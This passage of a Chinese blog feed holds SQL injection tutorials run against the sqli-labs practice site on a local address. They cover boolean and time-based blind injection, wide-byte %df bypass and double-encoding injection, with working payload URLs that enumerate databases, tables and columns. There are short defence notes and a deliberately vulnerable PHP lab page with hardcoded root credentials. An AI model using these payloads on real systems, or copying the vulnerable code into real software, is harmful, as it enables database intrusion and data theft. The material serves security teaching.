class="number">1</span>))=<span class="number">105</span>  <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line">	<span class="keyword">ord</span>()函数和<span class="keyword">mid</span>()函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  ord(mid((select column_name from information_schema.columns where table_name=&#x27;</span>emails<span class="string">&#x27; LIMIT 0,1),1,1))=105  --+ </span></span><br></pre></td></tr></table></figure>
<p> 查询出来了第一个列是<code>id</code>其他的列就不查询</p>
</li>
<li><p>查询数据内容<br> 通过上面的查询知道了库明，表明，列明<br> 就可以查询数据了<br> URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left((select id from security.emails LIMIT 0,1 ),1)=&#39;2&#39; --+ </code><br> 结果是1<br> 输入2没有显示<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813134431665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入1显示了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813134551222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>其他函数查询方法</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">regexp函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  (<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> security.emails <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span> )  regexp <span class="string">&#x27;^1&#x27;</span> <span class="comment">--+ </span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">like</span>函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  (select id from security.emails LIMIT 0,1 )  like &#x27;</span><span class="number">1</span>%<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">substr()函数和ascii()函数	</span></span><br><span class="line"><span class="string">http://192.168.0.102/Less-8/?id=1&#x27;</span> <span class="keyword">and</span>  <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> security.emails <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span> ),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">49</span>  <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line">	<span class="keyword">ord</span>()函数和<span class="keyword">mid</span>()函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  ord(mid((select id from security.emails LIMIT 0,1 ) ,1,1))=49  --+ </span></span><br></pre></td></tr></table></figure>
<p> 数据库内容是结果是1</p>
</li>
</ol>
<p><strong>这样查询非常麻烦</strong></p>
]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>5. 网易web安全渗透， sql时间盲注</title>
    <url>/2020/08/29/5.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%EF%BC%8C%20sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="sql注入漏洞时间盲注原理"><a href="#sql注入漏洞时间盲注原理" class="headerlink" title="sql注入漏洞时间盲注原理"></a>sql注入漏洞时间盲注原理</h2><p>根据时间来判断漏洞<br>代码<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814112506540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>不管你输入什么都不显示<br>这个就很难检查出来sql注入漏洞<br>我们就可以根据网站的延迟时间来判断是否查询sql注入漏洞和数据</p>
<h2 id="sql注入漏洞时间盲注方法"><a href="#sql注入漏洞时间盲注方法" class="headerlink" title="sql注入漏洞时间盲注方法"></a>sql注入漏洞时间盲注方法</h2><p><strong>现在的数据库名是dvwa</strong><br>抛开的来说</p>
<ol>
<li><p>sleep()函数<br> 他这个函数是延迟程序执行的<br> 代码</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">sleep</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
<p> dai代码的意思是延迟100秒赞在执行<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081411525959.png#pic_center" alt="在这里插入图片描述"></p>
</li>
<li><p>核心语法：就可以判断数据库名了<br> <strong>当前数据库名是dvwa</strong></p>
</li>
</ol>
<pre><code>代码
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">left</span>(<span class="keyword">database</span>(),<span class="number">1</span>)=<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>,<span class="keyword">sleep</span>(<span class="number">3</span>));</span><br></pre></td></tr></table></figure>
left()函数这个有说[4. 网易web安全渗透， sql 布尔型盲注](https://blog.csdn.net/qq_41860876/article/details/107815405)
上面代码介绍
意思判断是`database()`查询当前数据库名第1个字符比较正确直接返回`0`    错误就执行`sleep(3)`延迟3秒返回`0`
结果是d

这个我输入`a`他延迟3秒说明不是`a`![在这里插入图片描述](https://img-blog.csdnimg.cn/20200814115450200.png#pic_center)

我输入`d`他立刻就执行了说明就是`d`字符</code></pre>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814120137363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<ol start="3">
<li><p>真实场景：就可以判断数据库名了<br> 在真实场景网站可能要waf和其他机智就不让输入<code>&#39;</code><br> 就可以上一节学习到的<code>substr()</code>函数和<code>ascii()</code>函数在这个查看<a href="https://blog.csdn.net/qq_41860876/article/details/107815405">4. 网易web安全渗透， sql 布尔型盲注</a></p>
<p> 列<br> 数据库名是dvwa<br> 代码</p>
</li>
</ol>
<pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">100</span>,<span class="number">0</span>,<span class="keyword">sleep</span>(<span class="number">3</span>));</span><br></pre></td></tr></table></figure>
代码介绍
的意思是查询当前数据库名称取第一个到第一个字符串，
然后`ascii()`函数叫字符串转化成`ascii`码，然后进行比较正确就直接返回0，错误就执行sleep(3)延迟3秒返回0
结果是`100=d`    

输入`97`
`97=a`
延迟3秒，说明数据库名的第一个字符不是`a`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200814122024728.png#pic_center)</code></pre>
<p>输入<code>100 </code><br><code>100=d</code><br>发现立即执行了说明就是<code>d</code><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122134983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="1-判断是否查询sql注入漏洞"><a href="#1-判断是否查询sql注入漏洞" class="headerlink" title="1. 判断是否查询sql注入漏洞"></a>1. 判断是否查询sql注入漏洞</h3><p>第10关<br>输入<code>http://192.168.0.102/Less-10/?id=1</code><br>返回<strong>You are in………..</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122521235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>http://192.168.0.102/Less-10/?id=1&#39;</code><br>返回<strong>You are in………..</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122700875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>http://192.168.0.102/Less-10/?id=1&#39; and &#39;1&#39; =&#39; 1  --+ </code><br>返回<strong>You are in………..</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122815430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>http://192.168.0.102/Less-10/?id=1&#39; and &#39;1&#39; =&#39; 2  --+ </code><br>还是返回返回<strong>You are in………..</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122857588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>192.168.0.102/Less-10/?id=1&#39; )  or  (&#39;a&#39;=&#39;a  --+</code><br>还是返回还是返回返回<strong>You are in………..</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814123200314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>等等等等等等等等等等等等等等其他方法我就不演示了<br>发现根本就没有注入点</p>
<p>我们就可以使用sql时间盲注了</p>
<p>输入<code>http://192.168.0.102/Less-10/?id=1&quot; and if(left(user(),1)=&#39;a&#39;,0,sleep(3)) --+</code><br><strong>user()查询当前的用户名</strong><br>输入<code>a</code>发现延迟3秒<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814124903659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>直到输入到r发现没有延迟，说明存在sql注入漏洞</strong><br>输入<code>http://192.168.0.102/Less-10/?id=1&quot; and if(left(user(),1)=&#39;r&#39;,0,sleep(3)) --+</code><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814125146137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="数据读取"><a href="#数据读取" class="headerlink" title="数据读取"></a>数据读取</h3><p>读取当前数据库<br>URL地址<code>http://192.168.0.102/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))=100,0,sleep(3)) --+</code><br>输入<code>100=d</code><br>发现<code>3</code>秒才返回<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814130304432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>115=s</code><br>发现直接就响应了说明就是<code>s</code><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814130441125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>这个太麻烦而且还慢可以自己<br>写一个sql时间盲注脚本应为我时间不多，有时间在写</p>
]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>6. 网易web安全渗透， sql漏洞之宽字节注入</title>
    <url>/2020/08/29/6.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%EF%BC%8C%20sql%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><h3 id="什么是宽字节"><a href="#什么是宽字节" class="headerlink" title="什么是宽字节"></a>什么是宽字节</h3><p>GB2312、GBK、GB18030、BIG5、Shift_JIS都是常见的宽字节编码</p>
<ul>
<li><p>1个字节的字符，是短字节，所有的英文占1个字节</p>
<ul>
<li>我们都知道1个字节占8位比如<code>a</code>二进制表示就是<code>01011101</code>，0和1组合有255种完全满足英文的</li>
</ul>
</li>
<li><p>2个字节的字符，是宽字节，中文默认都是占两个字节的</p>
<ul>
<li>如果我们用1个字节表示中文是远远不够的，所有要用两个字节</li>
</ul>
</li>
</ul>
<h3 id="什么是宽字节注入"><a href="#什么是宽字节注入" class="headerlink" title="什么是宽字节注入"></a>什么是宽字节注入</h3><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818091131109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>防御：有的网站会进行过滤，<code>&#39;</code>给转换成<code>\&#39;</code><br>绕过：将\给消灭掉<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818091609298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="宽字节注入实战"><a href="#宽字节注入实战" class="headerlink" title="宽字节注入实战"></a>宽字节注入实战</h2><p>第32关</p>
<h3 id="判断是否存在sql注入漏洞"><a href="#判断是否存在sql注入漏洞" class="headerlink" title="判断是否存在sql注入漏洞"></a>判断是否存在sql注入漏洞</h3><p>输入URL：<code>http://192.168.0.108/Less-32/?id=1</code><br>正常显示</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818093121739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>下面加上<code>&#39;</code><br>输入URL地址： <code>http://192.168.0.108/Less-32/?id=1&#39;</code><br>这个他专门显示了被转换了<code>\&#39;</code><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818093727965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们就可以进行宽字节探测了<br>添加<code>%df</code><br>输入URL：<code>http://192.168.0.108/Less-32/?id=1%df&#39;</code><br><code>%df</code>加<code>\</code>会变成<code>運</code><br>就没有<code>\</code>了</p>
<p>发现是可以注入点<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818094514610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>如果还是不确定可以用<code>and 1=1</code>来判断</p>
<p>输入URL：<code>http://192.168.0.108/Less-32/?id=1%df&#39; and 1=1  --+</code><br>正常<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818095156648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入URL：<code>http://192.168.0.108/Less-32/?id=1%df&#39; and 1=2  --+</code><br>没有显示<br>是确定是存在sql注入漏洞的<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818095239932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="进行读取数据"><a href="#进行读取数据" class="headerlink" title="进行读取数据"></a>进行读取数据</h3><p>和基本的注入查询一样</p>
<ol>
<li><p>判断有几列<br> 输入URL：<code>http://192.168.0.108/Less-32/?id=1%df&#39; order by 2  --+</code> </p>
<p> 输入<code>2</code>显示正常<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818095546443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现输入到4就报错了<br>输入URL：<code>http://192.168.0.108/Less-32/?id=1%df&#39; order by 4  --+</code> </p>
</li>
</ol>
<p><strong>可以判断有<code>3</code>列</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818095646855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>2. 观察页面返回，选择可以显示数据的位置，进行下一步的注入<br>    输入URL：<code>http://192.168.0.108/Less-32/?id=-1 %df&#39; union select 1,2,3   --+</code><br>    <strong>结果是<code>2</code>和<code>3</code></strong><br>    <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081810011290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>3. 读取库的信息<br>    输入URL：<code>http://192.168.0.108/Less-32/?id=-1 %df&#39; union select 1,user(),3   --+</code><br>    内容显示了<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081810024953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>4. 查看数据库名<br>    输入URL：<code>http://192.168.0.108/Less-32/?id=-1 %df&#39; union select 1,(select schema_name from information_schema.schemata LIMIT 0,1),3   --+</code><br>    这个他之显示第一个数据库的名<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818100503615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>    <strong>读取全部的库名</strong><br>    输入URL：<code>http://192.168.0.108/Less-32/?id=-1 %df&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3   --+</code><br>    用到了group_concat()函数，<br>应为有很多数据库他只能显示一个，所以用group_concat()叫所以库名都显示到一列中<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818100715400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<ol start="5">
<li><p>读取查表<br> 通过上面的查询找到数据库全部的数据库名<br>通过数据库名就可以查询表了<br>输入URL：<code>http://192.168.0.108/Less-32/?id=-1 %df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3   --+</code><br>发现报错了应为’security’你面有用<code>&#39;</code></p>
<p> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818101612779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们就可以进行编码逃避用<code>&#39;</code><br>输入URL：<code>http://192.168.0.108/Less-32/?id=-1 %df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),3   --+</code> </p>
<p> 就读取出来表了<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818101852262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>等等后面都和普通的注入方法一样就不演示了</p>
</li>
</ol>
<h2 id="宽字节注入防御"><a href="#宽字节注入防御" class="headerlink" title="宽字节注入防御"></a>宽字节注入防御</h2><ol>
<li>使用UTF-8就可以完美防御宽字节注入<ol start="2">
<li>php mysql_real_escape_string()函数和mysqli_set_charset() 函数</li>
</ol>
</li>
</ol>
<pre><code>1.mysql_real_escape_string()是用来转义 SQL 语句中使用的字符串中的特殊字符
下列字符受影响：


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br></pre></td></tr></table></figure>
如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。
2.mysqli_set_charset()函数是修改数据库连接字符集
他两个组合起来就可以防御了</code></pre>
<ol start="3">
<li>设置成二进制的模式就可以了<br> mysql_query() 函数执行一条 MySQL 查询<br> 他有两个参数一个是执行的语句一个是执行的，可选。规定 SQL 连接标识符<br> 这个里面就可以添加一个<code>character_set_client=binary</code><br>就可以防御了</li>
</ol>
]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>7. 网易web安全渗透， sql漏洞之二次编码注入</title>
    <url>/2020/08/29/7.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%EF%BC%8C%20sql%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="二次编码注入原理"><a href="#二次编码注入原理" class="headerlink" title="二次编码注入原理"></a>二次编码注入原理</h2><p>为什么要进行编码，有点应为原始的格式并不适合传输<br>比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+  &#x3D;  &amp;  ;</span><br></pre></td></tr></table></figure>
<p>要是上面的这个符号在http传输中会和原始的有冲突</p>
<p>原理<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200820104019273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>urlencode()函数就是URL编码的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">&quot;%25&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;urlencode($str);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果等于</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">%</span><br></pre></td></tr></table></figure>


<p>上面的<code>%25</code>url解码后就是<code>%</code><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200820104640818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><code>%27</code>就是<code>&#39;</code><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200820105252656.png#pic_center" alt="在这里插入图片描述"></p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="实验环境搭建"><a href="#实验环境搭建" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h3><p>应为没有实验环境我就自己写了一个<br>a.php文件<br>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">	&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">	&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$id=addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">	$s = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">	$u= <span class="string">&quot;root&quot;</span>;</span><br><span class="line">	$p = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建连接</span></span><br><span class="line">	$conn = mysqli_connect($s, $u, $p);	 </span><br><span class="line">	<span class="comment">// 检测连接</span></span><br><span class="line">	<span class="keyword">if</span> (!$conn) &#123;</span><br><span class="line">	    <span class="keyword">die</span>(<span class="string">&quot;连接失败： &quot;</span> . mysqli_connect_error());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	$id=urldecode($id);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	mysqli_select_db($conn,<span class="string">&#x27;security&#x27;</span>);</span><br><span class="line">	$a=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;sql执行的语句： &#x27;</span>.$a.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	$b=mysqli_query($conn,$a);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;输出结果:&#x27;</span>;</span><br><span class="line">	$DuQu=mysqli_fetch_assoc($b);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($DuQu) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;\&quot;&quot;</span>.$DuQu[<span 